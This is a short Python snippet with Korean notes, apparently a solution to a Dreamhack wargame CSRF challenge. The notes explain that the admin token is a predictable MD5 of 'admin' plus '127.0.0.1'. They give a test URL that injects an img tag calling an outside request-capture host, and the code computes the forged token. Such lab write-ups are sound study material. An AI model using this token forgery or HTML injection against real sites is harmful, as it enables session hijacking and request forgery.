'''
solution..!
- token 값은 완전 랜덤한 값으로 부여되지 않음
- md5로 처리하며 확인해보면 admin으로 로그인할 경우 token값은 고정되어 있음
- vuln 페이지로 가서 csrf로 해결해야함
- dreamhack tools로 임의 url 만들고 테스트
    - https://tools.dreamhack.games/requestbin/rjjkrhz
    - http://host3.dreamhack.games:9840/vuln?param=%3Cimg%20src=https://rjjkrhz.request.dreamhack.games%3E

'''

import hashlib
import os

token = hashlib.md5(("admin" + "127.0.0.1").encode()).hexdigest()
print(token)
print(os.urandom(8).hex())